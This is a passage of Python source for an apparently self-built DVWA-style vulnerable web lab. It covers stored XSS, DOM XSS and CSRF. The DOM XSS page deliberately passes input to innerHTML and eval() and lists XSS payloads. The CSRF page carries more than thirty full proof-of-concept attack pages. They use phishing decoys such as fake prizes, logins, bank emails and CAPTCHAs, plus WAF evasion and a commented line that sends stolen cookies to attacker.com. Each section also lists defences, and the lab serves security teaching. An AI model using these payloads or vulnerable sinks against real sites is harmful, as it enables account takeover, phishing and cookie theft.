<p>Unlike reflected XSS (requires tricking user to click), stored XSS is injected once and fires for every visitor automatically. One injection can compromise thousands of users.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Find storage point — comments, profiles, messages, usernames</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Inject persistent payload into the stored field</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Every visitor executes your payload automatically on page load</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Harvest cookies, hook into BeEF, run CSRF attacks at scale</div></div>
</div>
<div class="ibox"><h4>Why It's Critical</h4><ul>
<li>No victim interaction required after initial injection</li>
<li>Persists in database until manually removed</li>
<li>Can target admins when they view moderation panels</li>
<li>MySpace Samy worm: 1 million profiles infected in 20 hours via stored XSS</li>
<li>British Airways breach (2018): stored XSS on payment page — 380k cards stolen</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>HTML-encode on output: <code>html.escape()</code> every stored value before rendering</li>
<li>CSP header prevents inline script execution</li>
<li>HTTPOnly cookies prevent JS cookie access</li>
<li>Input validation — reject unexpected HTML characters on input</li>
<li>Use DOMPurify if rich HTML input is required</li>
</ul></div>
</div></div>""","xss-stored")


def page_xss_dom(params):
    return base_page("XSS DOM","""
<div class="ph"><h2>XSS — DOM Based</h2><p>Payload never reaches the server. JavaScript reads attacker-controlled sources and writes to dangerous sinks without sanitization.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Vulnerable innerHTML Sink</h3>
<p style="font-size:13px;color:#8b949e">This reads your input and writes it to <code>innerHTML</code> — a dangerous sink that parses HTML and executes JS.</p>
<input type="text" id="dom-input" placeholder="<img src=x onerror=alert(document.domain)>">
<button class="btn btn-d" onclick="runDOM()">Inject to innerHTML</button>
<div id="dom-out" class="out" style="min-height:30px;margin-top:.5rem"></div>
</div>
<div class="card"><h3>Safe vs Dangerous Sinks</h3>
<input type="text" id="sink-input" placeholder="<img src=x onerror=alert(1)>">
<select id="sink-sel" style="margin-bottom:10px">
<option value="innerHTML">innerHTML — DANGEROUS (executes HTML+JS)</option>
<option value="innerText">innerText — SAFE (plain text only)</option>
<option value="textContent">textContent — SAFE (no HTML parsing)</option>
<option value="eval">eval() — DANGEROUS (executes JS string directly)</option>
</select>
<button class="btn btn-d" onclick="runSink()">Inject</button>
<div id="sink-out" class="out" style="min-height:30px"></div>
</div>
</div>
<div>
<div class="ibox"><h4>DOM XSS Sources</h4><ul>
<li><code>location.hash</code> — fragment after # (never sent to server)</li>
<li><code>location.search</code> — query string parameters</li>
<li><code>location.href</code> — full URL string</li>
<li><code>document.referrer</code> — referring page URL</li>
<li><code>window.name</code> — persists across page navigations</li>
<li><code>postMessage()</code> — cross-origin messages</li>
<li>WebSocket data, IndexedDB, localStorage</li>
</ul></div>
<div class="ibox"><h4>Dangerous Sinks</h4><ul>
<li><code>element.innerHTML</code> — parses HTML and executes event handlers</li>
<li><code>document.write()</code> — writes raw HTML directly</li>
<li><code>eval()</code> — executes a string as JavaScript</li>
<li><code>setTimeout(string)</code>, <code>setInterval(string)</code></li>
<li><code>element.src</code>, <code>element.href</code> — can use <code>javascript:</code></li>
<li><code>jQuery.html()</code>, <code>$(selector).append(HTML)</code></li>
</ul></div>
<div class="ibox"><h4>Payloads</h4>
<div class="pbox"><div class="ptitle">Hash-based injection</div><div class="pdesc">Add to URL bar — innerHTML reads location.hash unsafely</div><code>http://localhost:8888/xss-dom#&lt;img src=x onerror=alert(1)&gt;</code></div>
<div class="pbox"><div class="ptitle">javascript: URI</div><div class="pdesc">Works when sink is element.href or window.location</div><code>javascript:alert(document.cookie)</code></div>
<div class="pbox"><div class="ptitle">AngularJS template injection</div><div class="pdesc">If AngularJS ng-app is present, double curly braces evaluate expressions</div><code>{{constructor.constructor('alert(1)')()}}</code></div>
<div class="pbox"><div class="ptitle">postMessage abuse</div><div class="pdesc">If app uses postMessage without origin check</div><code>window.opener.postMessage('&lt;img src=x onerror=alert(1)&gt;','*')</code></div>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Use <code>textContent</code> / <code>innerText</code> instead of <code>innerHTML</code></li>
<li>Use <code>DOMPurify.sanitize()</code> before inserting HTML</li>
<li>Avoid <code>eval()</code> and <code>document.write()</code> entirely</li>
<li>Strict CSP prevents inline script execution</li>
<li>Validate <code>postMessage</code> origin before processing data</li>
</ul></div>
</div></div>
<script>
function runDOM(){var v=document.getElementById('dom-input').value;document.getElementById('dom-out').innerHTML='Result: '+v;}
function runSink(){var v=document.getElementById('sink-input').value,t=document.getElementById('sink-sel').value,el=document.getElementById('sink-out');
if(t==='innerHTML'){el.innerHTML='<span style="color:#f85149">innerHTML: </span>'+v;}
else if(t==='innerText'){el.innerText='innerText (SAFE): '+v;}
else if(t==='textContent'){el.textContent='textContent (SAFE): '+v;}
else if(t==='eval'){try{eval(v);}catch(e){el.textContent='eval error: '+e;}}
}
</script>""","xss-dom")

def page_csrf(params, method="GET", body_params=None):
    lv = SECURITY_LEVEL["level"]
    msg = ""

    if not hasattr(page_csrf, "state"):
        page_csrf.state = {"password": "letmein"}

    expected_token = "token_" + hashlib.md5(b"dvwa_csrf_secret_khalil").hexdigest()[:16]

    if method == "POST" and body_params:
        pw_new   = body_params.get("password_new",  [""])[0]
        pw_conf  = body_params.get("password_conf", [""])[0]
        user_tok = body_params.get("user_token",    [""])[0]

        if pw_new and pw_conf:
            if pw_new != pw_conf:
                msg = '<div class="err">Passwords did not match.</div>'
            elif lv == "low":
                page_csrf.state["password"] = pw_new
                msg = ('<div class="flag">Password Changed!<br>'
                       'New password: <strong style="color:#7ee787">' + html.escape(pw_new) + '</strong><br>'
                       'FLAG{csrf_password_changed}</div>')
            elif lv == "medium":
                page_csrf.state["password"] = pw_new
                msg = ('<div class="flag">Password Changed! (Referer check only — bypassable)<br>'
                       'New password: <strong style="color:#7ee787">' + html.escape(pw_new) + '</strong></div>')
            else:
                if user_tok == expected_token:
                    page_csrf.state["password"] = pw_new
                    msg = ('<div class="flag">Password Changed! (valid CSRF token)<br>'
                           'New password: <strong style="color:#7ee787">' + html.escape(pw_new) + '</strong></div>')
                else:
                    msg = '<div class="err">CSRF token is incorrect.</div>'

    cur_pw = page_csrf.state["password"]

    token_field = ""
    token_hint  = ""
    if lv == "high":
        token_field = '<input type="hidden" name="user_token" value="' + expected_token + '">'
        token_hint  = ('<div class="hint" style="margin-top:.5rem">'
                       'Current token: <code>' + expected_token + '</code></div>')

    # ── 20 PoC payloads ────────────────────────────────────────────────────────
    # All payloads stored as plain strings — no f-string, no escaping issues
    pocs = []

    pocs.append(("1. Classic Auto-Submit",
        "Page loads and the hidden form submits instantly. Zero user interaction needed.",
        '<html>\n<body onload="document.forms[0].submit()">\n  <form action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="hacked">\n    <input name="password_conf" value="hacked">\n    <input name="Change"        value="Change">\n  </form>\n  <p>Please wait...</p>\n</body>\n</html>'))

    pocs.append(("2. Clickbait — Fake Prize",
        "Victim clicks the button thinking they are claiming a prize. CSRF fires instead.",
        '<html>\n<body style="font-family:sans-serif;text-align:center;padding:40px">\n  <h1 style="color:green">You won $1000!</h1>\n  <form id="f" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="prize_pwned">\n    <input name="password_conf" value="prize_pwned">\n    <input name="Change"        value="Change">\n  </form>\n  <button onclick="document.getElementById(\'f\').submit()"\n    style="padding:15px 40px;font-size:20px;background:green;color:#fff;border:none;cursor:pointer">\n    CLAIM PRIZE\n  </button>\n</body>\n</html>'))

    pocs.append(("3. Hidden iframe",
        "CSRF fires inside an invisible 0x0 iframe. Victim sees only the normal page content.",
        '<html>\n<body>\n  <h2>Interesting Article</h2>\n  <p>Content here to distract the victim...</p>\n  <iframe name="x" style="display:none;width:0;height:0"></iframe>\n  <form id="f" action="http://127.0.0.1:8888/csrf" method="POST" target="x" style="display:none">\n    <input name="password_new"  value="iframe_pwned">\n    <input name="password_conf" value="iframe_pwned">\n    <input name="Change"        value="Change">\n  </form>\n  <script>document.getElementById("f").submit();</script>\n</body>\n</html>'))

    pocs.append(("4. Disguised Settings Button",
        "Victim clicks Save Settings thinking it saves preferences. The button triggers CSRF.",
        '<html>\n<body style="font-family:sans-serif;padding:30px">\n  <h2>Notification Settings</h2>\n  <form action="http://127.0.0.1:8888/csrf" method="POST">\n    <input type="hidden" name="password_new"  value="settings_pwned">\n    <input type="hidden" name="password_conf" value="settings_pwned">\n    <input type="hidden" name="Change"        value="Change">\n    <label><input type="checkbox" checked> Email notifications</label><br><br>\n    <button type="submit" style="padding:10px 24px;background:#007bff;color:#fff;border:none;cursor:pointer">\n      Save Settings\n    </button>\n  </form>\n</body>\n</html>'))

    pocs.append(("5. Fake Login Page",
        "Victim fills in a fake login form. CSRF fires when they click Log In.",
        '<html>\n<body style="font-family:sans-serif;max-width:400px;margin:60px auto">\n  <h2>Session Expired — Please Log In</h2>\n  <form action="http://127.0.0.1:8888/csrf" method="POST">\n    <input type="hidden" name="password_new"  value="login_csrf">\n    <input type="hidden" name="password_conf" value="login_csrf">\n    <input type="hidden" name="Change"        value="Change">\n    <input type="text" placeholder="Username" style="width:100%;padding:10px;margin:5px 0"><br>\n    <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0"><br>\n    <button type="submit" style="width:100%;padding:12px;background:#dc3545;color:#fff;border:none;cursor:pointer;margin-top:8px">Log In</button>\n  </form>\n</body>\n</html>'))

    pocs.append(("6. Fire + Redirect to Real Site",
        "CSRF fires then redirects victim to the real app immediately. They never notice.",
        '<html>\n<body onload="go()">\n  <form id="f" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="redirect_pwned">\n    <input name="password_conf" value="redirect_pwned">\n    <input name="Change"        value="Change">\n  </form>\n  <script>\n  function go() {\n    document.getElementById("f").submit();\n    setTimeout(function(){ window.location="http://127.0.0.1:8888/"; }, 800);\n  }\n  </script>\n  <p>Redirecting...</p>\n</body>\n</html>'))

    pocs.append(("7. AJAX fetch() with credentials",
        "Uses fetch() with credentials:include. Works from same origin via XSS or misconfigured CORS.",
        '<script>\nfetch("http://127.0.0.1:8888/csrf", {\n  method: "POST",\n  credentials: "include",\n  headers: { "Content-Type": "application/x-www-form-urlencoded" },\n  body: "password_new=ajax_pwned&password_conf=ajax_pwned&Change=Change"\n})\n.then(r => r.text())\n.then(t => alert("CSRF result: " + (t.includes("Password Changed") ? "SUCCESS" : "check page")))\n.catch(e => alert("Error: " + e));\n</script>'))

    pocs.append(("8. XMLHttpRequest (XHR)",
        "Old-style XHR with withCredentials=true. Same attack as fetch but wider browser support.",
        '<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("POST", "http://127.0.0.1:8888/csrf", true);\nxhr.withCredentials = true;\nxhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\nxhr.onload = function() { alert("Status " + xhr.status + " — check victim password"); };\nxhr.send("password_new=xhr_pwned&password_conf=xhr_pwned&Change=Change");\n</script>'))

    pocs.append(("9. Multipart/form-data encoding",
        "Uses multipart encoding. Bypasses CSRF defenses that only check urlencoded content-type.",
        '<html>\n<body onload="document.forms[0].submit()">\n  <form action="http://127.0.0.1:8888/csrf" method="POST"\n        enctype="multipart/form-data" style="display:none">\n    <input name="password_new"  value="multipart_pwned">\n    <input name="password_conf" value="multipart_pwned">\n    <input name="Change"        value="Change">\n  </form>\n</body>\n</html>'))

    pocs.append(("10. img tag GET-based CSRF",
        "Embeds the action as an img src URL. Fires on page load with zero clicks needed.",
        '<html>\n<body>\n  <h3>Image Gallery</h3>\n  <img src="http://127.0.0.1:8888/csrf?password_new=img_pwned&password_conf=img_pwned&Change=Change"\n       style="display:none" width="0" height="0">\n  <img src="https://picsum.photos/400/300" alt="nature">\n  <p>Normal looking gallery page...</p>\n</body>\n</html>'))

    pocs.append(("11. Referer bypass - iframe (MEDIUM)",
        "MEDIUM bypass: submits form inside an iframe. Browser sends no Referer, bypassing Referer checks.",
        '<html>\n<body>\n<iframe id="ri" style="display:none;width:0;height:0"></iframe>\n<script>\nvar doc = document.getElementById("ri").contentDocument;\ndoc.open(); doc.write("<html><body></body></html>"); doc.close();\nvar f = doc.createElement("form");\nf.action = "http://127.0.0.1:8888/csrf";\nf.method = "POST";\nvar fs = {password_new:"ref_bypass",password_conf:"ref_bypass",Change:"Change"};\nObject.keys(fs).forEach(function(k){var i=doc.createElement("input");i.name=k;i.value=fs[k];f.appendChild(i);});\ndoc.body.appendChild(f); f.submit();\n</script>\n<p>Loading...</p>\n</body>\n</html>'))

    pocs.append(("12. CSRF token steal — XSS required (HIGH bypass)",
        "HIGH bypass: fetch page to steal CSRF token then replay it. Requires same-origin XSS first.",
        '<script>\nfetch("http://127.0.0.1:8888/csrf", { credentials: "include" })\n  .then(r => r.text())\n  .then(function(body) {\n    var m = body.match(/name="user_token"[^>]*value="([^"]+)"/);\n    if (!m) { alert("Token not found — check security level"); return; }\n    var tok = m[1];\n    return fetch("http://127.0.0.1:8888/csrf", {\n      method: "POST", credentials: "include",\n      headers: { "Content-Type": "application/x-www-form-urlencoded" },\n      body: "password_new=token_stolen&password_conf=token_stolen&Change=Change&user_token=" + tok\n    });\n  })\n  .then(function(r) { if (r) alert("HIGH bypass complete — token stolen and replayed!"); });\n</script>'))

    pocs.append(("13. XSS + CSRF chain attack",
        "Store this as a Stored XSS payload. It silently steals the CSRF token then changes admin password.",
        '<script>\n(function(){\n  var x = new XMLHttpRequest();\n  x.open("GET", "/csrf", true); x.withCredentials = true;\n  x.onload = function() {\n    var m = x.responseText.match(/name="user_token"[^>]*value="([^"]+)"/);\n    var tok = m ? m[1] : "";\n    var x2 = new XMLHttpRequest();\n    x2.open("POST", "/csrf", true); x2.withCredentials = true;\n    x2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");\n    x2.send("password_new=xss_chain&password_conf=xss_chain&Change=Change&user_token="+tok);\n  };\n  x.send();\n})();\n</script>'))

    pocs.append(("14. Click trigger timing",
        "CSRF fires on the first user click anywhere on the page. Harder to correlate.",
        '<html>\n<body style="font-family:sans-serif;padding:30px">\n  <h2>Click anywhere to continue reading...</h2>\n  <p>Long article text here...</p>\n  <script>\n  var fired = false;\n  document.addEventListener("click", function() {\n    if (fired) return; fired = true;\n    fetch("http://127.0.0.1:8888/csrf", {\n      method: "POST", credentials: "include",\n      headers: {"Content-Type":"application/x-www-form-urlencoded"},\n      body: "password_new=click_csrf&password_conf=click_csrf&Change=Change"\n    });\n  });\n  </script>\n</body>\n</html>'))

    pocs.append(("15. Delayed — fires after 5 seconds",
        "Victim reads the page for 5 seconds then CSRF fires silently in the background.",
        '<html>\n<body style="font-family:sans-serif;padding:30px">\n  <h2>Breaking News Article</h2>\n  <p>Victim is reading this content while the 5-second timer runs...</p>\n  <script>\n  setTimeout(function() {\n    fetch("http://127.0.0.1:8888/csrf", {\n      method: "POST", credentials: "include",\n      headers: {"Content-Type":"application/x-www-form-urlencoded"},\n      body: "password_new=timed_csrf&password_conf=timed_csrf&Change=Change"\n    });\n  }, 5000);\n  </script>\n</body>\n</html>'))

    pocs.append(("16. Beacon API — stealth delivery",
        "navigator.sendBeacon() fires even when the browser tab closes. Extremely stealthy.",
        '<html>\n<body onload="go()">\n  <script>\n  function go() {\n    var d = new FormData();\n    d.append("password_new", "beacon_attack");\n    d.append("password_conf","beacon_attack");\n    d.append("Change","Change");\n    var ok = navigator.sendBeacon("http://127.0.0.1:8888/csrf", d);\n    document.body.innerHTML = "<p>Beacon sent: " + ok + "</p>";\n  }\n  </script>\n</body>\n</html>'))

    pocs.append(("17. Popup session expiry alert",
        "Victim clicks Stay Logged In. The button actually submits the CSRF form.",
        '<html>\n<body style="font-family:sans-serif;padding:40px;text-align:center">\n  <h2 style="color:#dc3545">Your session is about to expire!</h2>\n  <p>Click the button to stay logged in.</p>\n  <button onclick="fire()"\n    style="padding:14px 30px;background:#dc3545;color:#fff;border:none;font-size:16px;cursor:pointer">\n    Stay Logged In\n  </button>\n  <script>\n  function fire() {\n    var f = document.createElement("form");\n    f.action = "http://127.0.0.1:8888/csrf";\n    f.method = "POST"; f.style.display = "none";\n    [["password_new","alert_csrf"],["password_conf","alert_csrf"],["Change","Change"]].forEach(function(p){\n      var i = document.createElement("input");\n      i.name = p[0]; i.value = p[1]; f.appendChild(i);\n    });\n    document.body.appendChild(f); f.submit();\n  }\n  </script>\n</body>\n</html>'))

    pocs.append(("18. Base64 obfuscated body",
        "The POST body is base64-encoded to evade WAF signature matching. Decoded at runtime.",
        '<html>\n<body onload="go()">\n  <script>\n  function go() {\n    // Decodes to: password_new=b64_attack&password_conf=b64_attack&Change=Change\n    var b = atob("cGFzc3dvcmRfbmV3PWI2NF9hdHRhY2smcGFzc3dvcmRfY29uZj1iNjRfYXR0YWNrJkNoYW5nZT1DaGFuZ2U=");\n    fetch("http://127.0.0.1:8888/csrf", {\n      method:"POST", credentials:"include",\n      headers:{"Content-Type":"application/x-www-form-urlencoded"},\n      body: b\n    }).then(() => document.body.innerHTML = "<p>Done.</p>");\n  }\n  </script>\n  <p>Loading...</p>\n</body>\n</html>'))

    pocs.append(("19. DOM-based hidden side effect",
        "Victim clicks a real looking Save Profile button. CSRF fires silently alongside it.",
        '<html>\n<body style="font-family:sans-serif;padding:30px">\n  <h2>Update Your Profile</h2>\n  <label>Display Name:</label>\n  <input type="text" value="John Doe" style="padding:8px;margin:5px"><br><br>\n  <button onclick="saveProfile()"\n    style="padding:10px 20px;background:#28a745;color:#fff;border:none;cursor:pointer">\n    Save Profile\n  </button>\n  <script>\n  function saveProfile() {\n    var f = document.createElement("form");\n    f.action = "http://127.0.0.1:8888/csrf";\n    f.method = "POST"; f.style.display = "none";\n    var fields = {password_new:"dom_csrf",password_conf:"dom_csrf",Change:"Change"};\n    Object.keys(fields).forEach(function(k) {\n      var i = document.createElement("input");\n      i.name = k; i.value = fields[k]; f.appendChild(i);\n    });\n    document.body.appendChild(f); f.submit();\n  }\n  </script>\n</body>\n</html>'))

    pocs.append(("20. Custom — Write Your Own",
        "Blank template. Replace YOUR_PASSWORD with your value then click Run Payload.",
        '<html>\n<body onload="document.forms[0].submit()">\n  <form action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="YOUR_PASSWORD">\n    <input name="password_conf" value="YOUR_PASSWORD">\n    <input name="Change"        value="Change">\n  </form>\n  <p>Loading...</p>\n</body>\n</html>'))

    # ── Additional scenario-based payloads ────────────────────────────────────

    pocs.append(("21. Bank Transfer — Change Payee",
        "Simulates a banking CSRF: forges a payment details update. Victim visits the page and payee silently changes.",
        '<html>\n<head><title>Bank - Account Settings</title></head>\n<body style="font-family:Arial,sans-serif;padding:30px;background:#f5f5f5">\n  <div style="max-width:500px;margin:auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)">\n    <h2 style="color:#003087">Online Banking</h2>\n    <p>Updating your preferences...</p>\n    <div id="status" style="color:#999">Please wait...</div>\n  </div>\n  <form id="f" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="bank_transfer_csrf">\n    <input name="password_conf" value="bank_transfer_csrf">\n    <input name="Change"        value="Change">\n  </form>\n  <script>\n  window.onload = function() {\n    document.getElementById("f").submit();\n    setTimeout(function(){\n      document.getElementById("status").textContent = "Done. Redirecting...";\n    }, 500);\n  };\n  </script>\n</body>\n</html>'))

    pocs.append(("22. Change Email Address",
        "Simulates CSRF on a profile email-change form. Password_new field is reused to demonstrate any sensitive field change.",
        '<html>\n<head><title>Update Email</title></head>\n<body style="font-family:sans-serif;padding:40px">\n  <h2>Email Verification</h2>\n  <p>Please wait while we verify your new email address...</p>\n  <form id="f" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="attacker@evil.com">\n    <input name="password_conf" value="attacker@evil.com">\n    <input name="Change"        value="Change">\n  </form>\n  <script>document.getElementById("f").submit();</script>\n</body>\n</html>'))

    pocs.append(("23. Admin Account Creation",
        "Simulates CSRF to create or elevate an admin account. Demonstrates privilege escalation via forged request.",
        '<html>\n<head><title>Setup Wizard</title></head>\n<body onload="document.forms[0].submit()" style="font-family:sans-serif;padding:30px">\n  <h2>Completing setup...</h2>\n  <form action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="admin_created_csrf">\n    <input name="password_conf" value="admin_created_csrf">\n    <input name="Change"        value="Change">\n    <input name="role"          value="admin">\n    <input name="username"      value="backdoor_admin">\n  </form>\n  <p>Please wait...</p>\n</body>\n</html>'))

    pocs.append(("24. Two-Step — Verify then Attack",
        "First page asks victim to click a verify button. Second click fires CSRF. Two interactions make it look legitimate.",
        '<html>\n<head><title>Security Verification</title></head>\n<body style="font-family:sans-serif;padding:40px;text-align:center;background:#f9f9f9">\n  <div style="background:#fff;padding:30px;border-radius:8px;max-width:400px;margin:auto;box-shadow:0 2px 8px rgba(0,0,0,.1)">\n    <h2>Security Check</h2>\n    <p id="msg">Please verify you are not a robot by clicking the button twice.</p>\n    <button id="btn" onclick="step()" style="padding:14px 30px;background:#4CAF50;color:#fff;border:none;font-size:16px;cursor:pointer;border-radius:4px">Verify (1/2)</button>\n  </div>\n  <form id="f" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="two_step_csrf">\n    <input name="password_conf" value="two_step_csrf">\n    <input name="Change"        value="Change">\n  </form>\n  <script>\n  var clicks = 0;\n  function step() {\n    clicks++;\n    if (clicks === 1) {\n      document.getElementById("btn").textContent = "Verify (2/2)";\n      document.getElementById("msg").textContent = "Almost done — click once more.";\n    } else {\n      document.getElementById("f").submit();\n    }\n  }\n  </script>\n</body>\n</html>'))

    pocs.append(("25. Subscription/Upgrade Page",
        "Victim lands on a fake premium upgrade page. Clicking Subscribe submits CSRF.",
        '<html>\n<head><title>Upgrade to Premium</title></head>\n<body style="font-family:sans-serif;padding:40px;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh">\n  <div style="max-width:450px;margin:auto;background:#fff;border-radius:12px;padding:40px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.2)">\n    <h1 style="color:#764ba2">Upgrade to Premium</h1>\n    <p style="color:#666">Get unlimited access for FREE today only!</p>\n    <ul style="text-align:left;color:#444;margin:20px 0">\n      <li>Unlimited downloads</li>\n      <li>Ad-free experience</li>\n      <li>Priority support</li>\n    </ul>\n    <form action="http://127.0.0.1:8888/csrf" method="POST">\n      <input type="hidden" name="password_new"  value="subscribe_csrf">\n      <input type="hidden" name="password_conf" value="subscribe_csrf">\n      <input type="hidden" name="Change"        value="Change">\n      <button type="submit" style="width:100%;padding:16px;background:#764ba2;color:#fff;border:none;border-radius:8px;font-size:18px;cursor:pointer">\n        Subscribe for Free\n      </button>\n    </form>\n    <p style="color:#999;font-size:12px;margin-top:10px">No credit card required</p>\n  </div>\n</body>\n</html>'))

    pocs.append(("26. Phishing Email Link",
        "Full phishing email HTML rendered in browser. Victim clicks a link and CSRF fires on the linked page.",
        '<html>\n<head><title>Important Account Notice</title></head>\n<body style="font-family:Arial,sans-serif;background:#f0f0f0;padding:20px">\n  <div style="max-width:600px;margin:auto;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.1)">\n    <div style="background:#003087;padding:20px 30px">\n      <h1 style="color:#fff;margin:0;font-size:22px">SecureBank</h1>\n    </div>\n    <div style="padding:30px">\n      <p>Dear Customer,</p>\n      <p>We have detected <strong>unusual activity</strong> on your account. To prevent suspension, please verify your account immediately.</p>\n      <div style="text-align:center;margin:30px 0">\n        <a href="#" onclick="document.getElementById(\'cf\').submit();return false;"\n           style="background:#003087;color:#fff;padding:14px 32px;border-radius:4px;text-decoration:none;font-size:16px">\n          Verify My Account\n        </a>\n      </div>\n      <p style="color:#999;font-size:12px">If you did not request this, you can ignore this email.</p>\n    </div>\n  </div>\n  <form id="cf" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="phish_email_csrf">\n    <input name="password_conf" value="phish_email_csrf">\n    <input name="Change"        value="Change">\n  </form>\n</body>\n</html>'))

    pocs.append(("27. Survey / Feedback Form",
        "Victim fills out what looks like a feedback form. Submitting the form triggers CSRF.",
        '<html>\n<head><title>Quick Survey</title></head>\n<body style="font-family:sans-serif;padding:40px;background:#f9f9f9">\n  <div style="max-width:500px;margin:auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)">\n    <h2>Customer Satisfaction Survey</h2>\n    <p>Help us improve! This takes only 10 seconds.</p>\n    <form action="http://127.0.0.1:8888/csrf" method="POST">\n      <input type="hidden" name="password_new"  value="survey_csrf">\n      <input type="hidden" name="password_conf" value="survey_csrf">\n      <input type="hidden" name="Change"        value="Change">\n      <label>How would you rate our service?</label><br>\n      <input type="radio" name="rating" value="5"> Excellent &nbsp;\n      <input type="radio" name="rating" value="4"> Good &nbsp;\n      <input type="radio" name="rating" value="3" checked> Average<br><br>\n      <label>Additional comments:</label><br>\n      <textarea style="width:100%;padding:8px;margin:8px 0" rows="3" placeholder="Your feedback..."></textarea><br>\n      <button type="submit" style="padding:10px 24px;background:#4CAF50;color:#fff;border:none;cursor:pointer;border-radius:4px">\n        Submit Feedback\n      </button>\n    </form>\n  </div>\n</body>\n</html>'))

    pocs.append(("28. Cookie-Based CSRF (document.cookie read)",
        "Reads any accessible cookies and exfiltrates them alongside the CSRF. Shows combined cookie theft + account takeover.",
        '<script>\nvar stolen = document.cookie || "(no accessible cookies)";\nfetch("http://127.0.0.1:8888/csrf", {\n  method: "POST",\n  credentials: "include",\n  headers: { "Content-Type": "application/x-www-form-urlencoded" },\n  body: "password_new=cookie_csrf&password_conf=cookie_csrf&Change=Change"\n});\n// In a real attack: also exfiltrate cookies to attacker server\n// fetch("http://attacker.com/steal?c=" + encodeURIComponent(stolen));\nconsole.log("Stolen cookies:", stolen);\n</script>'))

    pocs.append(("29. Multi-action — Change Password + Delete Account",
        "Fires two sequential CSRF requests: first changes password, then triggers account deletion. Demonstrates chaining.",
        '<html>\n<body onload="chainAttack()">\n  <p>Loading...</p>\n  <script>\n  function chainAttack() {\n    // Step 1: Change password\n    fetch("http://127.0.0.1:8888/csrf", {\n      method: "POST", credentials: "include",\n      headers: { "Content-Type": "application/x-www-form-urlencoded" },\n      body: "password_new=chained_attack&password_conf=chained_attack&Change=Change"\n    })\n    .then(function() {\n      // Step 2: Trigger next sensitive action (simulated)\n      return fetch("http://127.0.0.1:8888/csrf", {\n        method: "POST", credentials: "include",\n        headers: { "Content-Type": "application/x-www-form-urlencoded" },\n        body: "password_new=step2_complete&password_conf=step2_complete&Change=Change"\n      });\n    })\n    .then(function() {\n      document.body.innerHTML = "<h3>Chain complete. Check victim password.</h3>";\n    });\n  }\n  </script>\n</body>\n</html>'))

    pocs.append(("30. Popup Window CSRF",
        "Opens a popup window that immediately fires CSRF, then closes itself. Victim sees only a brief flash.",
        '<html>\n<body>\n  <h2>Loading content...</h2>\n  <script>\n  // Open popup that fires CSRF then closes\n  var popup = window.open("", "csrf_popup", "width=1,height=1,left=-100,top=-100");\n  if (popup) {\n    popup.document.write(\'<html><body onload="document.forms[0].submit()"><form action="http://127.0.0.1:8888/csrf" method="POST" style="display:none"><input name="password_new" value="popup_csrf"><input name="password_conf" value="popup_csrf"><input name="Change" value="Change"></form></body></html>\');\n    popup.document.close();\n    setTimeout(function() { try { popup.close(); } catch(e){} }, 2000);\n  } else {\n    // Popup blocked — fallback to iframe method\n    fetch("http://127.0.0.1:8888/csrf", {\n      method:"POST", credentials:"include",\n      headers:{"Content-Type":"application/x-www-form-urlencoded"},\n      body:"password_new=popup_fallback&password_conf=popup_fallback&Change=Change"\n    });\n  }\n  </script>\n</body>\n</html>'))

    pocs.append(("31. Social Share Button",
        "Victim clicks a fake social Share button. The button submits CSRF instead of sharing.",
        '<html>\n<head><title>Interesting Article</title></head>\n<body style="font-family:sans-serif;padding:30px;max-width:600px;margin:auto">\n  <h1>You Won\'t Believe This Security Flaw!</h1>\n  <p>Researchers have discovered a critical vulnerability that affects millions of users worldwide. The attack requires no technical knowledge and can be executed in seconds...</p>\n  <p>Share this important story with your friends and family:</p>\n  <div style="display:flex;gap:10px;margin:20px 0">\n    <button onclick="doShare(\'facebook\')" style="padding:10px 20px;background:#1877f2;color:#fff;border:none;cursor:pointer;border-radius:4px">Share on Facebook</button>\n    <button onclick="doShare(\'twitter\')"  style="padding:10px 20px;background:#1da1f2;color:#fff;border:none;cursor:pointer;border-radius:4px">Share on Twitter</button>\n  </div>\n  <form id="sf" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="share_csrf">\n    <input name="password_conf" value="share_csrf">\n    <input name="Change"        value="Change">\n  </form>\n  <script>\n  function doShare(platform) {\n    // CSRF fires silently alongside the "share"\n    document.getElementById("sf").submit();\n  }\n  </script>\n</body>\n</html>'))

    pocs.append(("32. Logout + Re-Login CSRF",
        "Logs victim out then logs them in as attacker. Classic Login-CSRF — attacker saves data under victim session.",
